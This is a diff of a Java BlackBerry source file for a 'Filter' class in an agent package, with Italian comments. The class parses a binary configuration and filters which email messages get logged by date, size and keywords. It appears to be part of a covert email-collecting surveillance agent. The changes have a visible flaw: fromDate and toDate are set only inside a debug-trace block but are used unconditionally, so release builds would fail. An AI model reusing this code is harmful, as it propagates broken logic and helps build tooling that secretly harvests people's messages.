@@ -22,6 +22,7 @@ import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.agent.Prefix;
 import blackberry.utils.Check;
+import blackberry.utils.DateTime;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.WChar;
@@ -65,9 +66,9 @@ public class Filter {
     public boolean enabled;
     public boolean all;
     public boolean doFilterFromDate;
-    public long fromDate;
+    public Date fromDate;
     public boolean doFilterToDate;
-    public long toDate;
+    public Date toDate;
     public long maxMessageSize;
     public long maxMessageSizeToLog;
 
@@ -90,7 +91,7 @@ public class Filter {
     public Filter(final byte[] conf, final int offset, final int length) {
 
         final int headerSize = 116;
-        final int classNameLen = 32;
+        final int classNameLen = 64;
         final int confSize = conf.length - offset;
         //#ifdef DBC
         Check.requires(confSize >= headerSize, "conf smaller than needed");
@@ -139,21 +140,38 @@ public class Filter {
             debug.trace("classname: " + classString);
             //#endif
 
-            enabled = databuffer.readBoolean();
-            all = databuffer.readBoolean();
-            doFilterFromDate = databuffer.readBoolean();
-            fromDate = databuffer.readLong();
-            doFilterToDate = databuffer.readBoolean();
-            toDate = databuffer.readLong();
-            maxMessageSize = databuffer.readLong();
-            maxMessageSizeToLog = databuffer.readLong();
+            enabled = databuffer.readInt() == 1;
+            all = databuffer.readInt() == 1;
+            doFilterFromDate = databuffer.readInt() == 1;
+            long filetimeFromDate = databuffer.readLong();
+            doFilterToDate = databuffer.readInt() == 1;
+            long filetimeToDate = databuffer.readLong();
+            maxMessageSize = databuffer.readInt();
+            maxMessageSizeToLog = databuffer.readInt();
+
+            //#ifdef DEBUG_TRACE
+            if (doFilterFromDate) {
+                DateTime dt = new DateTime(filetimeFromDate);
+                fromDate = dt.getDate();
+                debug.trace("from: " + fromDate.toString());
+            }
+            if (doFilterToDate) {
+                DateTime dt = new DateTime(filetimeToDate);
+                toDate = dt.getDate();
+                debug.trace("to: " + toDate.toString());
+            }
+            debug.trace("maxMessageSize: " + maxMessageSize);
+            debug.trace("maxMessageSizeToLog: " + maxMessageSizeToLog);
+            //#endif
 
             payloadStart = (headerPrefix.payloadStart + size);
 
             valid = true;
         } catch (final EOFException e) {
             valid = false;
-
+            //#ifdef DEBUG_ERROR
+            debug.error("filter:" + e);
+            //#endif
         }
 
         // Lettura delle KEYWORDS
@@ -258,10 +276,9 @@ public class Filter {
 
         if (!enabled) {
             //#ifdef DEBUG_INFO
-            // debug.info("Disabled");
-            //#endif
-            // TODO: attenzione, da riabilitare, per qualche ragione e' sempre disabled
-            //return FILTERED_DISABLED;
+            debug.info("Disabled");
+            //#endif            
+            return FILTERED_DISABLED;
         }
 
         receivedTime = message.getReceivedDate().getTime();
@@ -274,7 +291,7 @@ public class Filter {
         }
 
         // se c'e' il filtro from e non viene rispettato escludi la mail
-        if (doFilterFromDate == true && receivedTime < fromDate) {
+        if (doFilterFromDate == true && receivedTime < fromDate.getTime()) {
             //#ifdef DEBUG_INFO
             debug.info("doFilterFromDate");
             //#endif
@@ -283,7 +300,7 @@ public class Filter {
 
         // Se c'e' anche il filtro della data di fine e non viene rispettato
         // escludi la mail
-        if (doFilterToDate == true && receivedTime > toDate) {
+        if (doFilterToDate == true && receivedTime > toDate.getTime()) {
             //#ifdef DEBUG_INFO
             debug.info("doFilterToDate");
             //#endif
